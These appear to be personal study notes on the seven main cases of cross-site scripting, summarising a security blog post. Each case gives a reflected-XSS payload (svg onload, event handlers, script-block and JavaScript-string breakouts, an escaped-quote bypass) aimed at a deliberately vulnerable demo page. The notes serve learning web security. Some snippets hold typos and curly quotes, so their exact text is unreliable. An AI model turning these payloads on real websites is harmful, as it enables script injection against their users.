a. 7 main xss cases:-

    https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/

    1. URL reflection
        - if URL is reflected somehow is source code use payload
            /”><svg onload=alert(1)>

    2. simple htmli (html injection)
        -  http://brutelogic.com.br/xss.php?a=<svg onload=alert(1)>

    3. inline htmli
        - simple as #2 but with ">
        - http://brutelogic.com.br/xss.php?b1=”><svg onload=alert(1)>

    4. inline htmli: no tag breaking
        - filtering of greater than char(>)
        - now we need event handler
        - http://brutelogic.com.br/xss.php?b3=” onmouseover=alert(1)//


    5. htmli in js(javascript) block
        - input sometime land into a javascript block(script tags),
        usually in the value of some variable of the code. But because
        the HTML tags has priority in the browser's parsing, we can
        simple terminate the block and insert a new tag.

        - http://brutelogic.com.br/xss.php?c1=</script><svg onload=alert(1)>

    6. simple js injection
        if the script tag is being filtered somehow, previous exploitat-
        ation will fail.

        - // simple js injection (single quotes)
        var myvar3 = '><svg onload=alert(1)>';
        - the payload above ins not going to work

        - it has to be this payload:-
        - http://brutelogic.com.br/xss.php?c3=’-alert(1)-‘
        
        - // simple js injeciton (single quotes)
        - var myvar3 = ''-alter(1)-'';


    7. Escaped js injection
    
        - in the above payload, if the quote is escaped with a backslash
        (\), injection won't work(it will be invalid syntax).

        // Escaped js inection (single quotes)
        var myvar3 = '\'-alert(1)-\'';

        - the below style of payload should be used

        - http://brutelogic.com.br/xss.php?c5=\’-alert(1)//

        - //escaped js injection (Single quotes) 
        - var myvar5 = '\\' -alert(1)//';


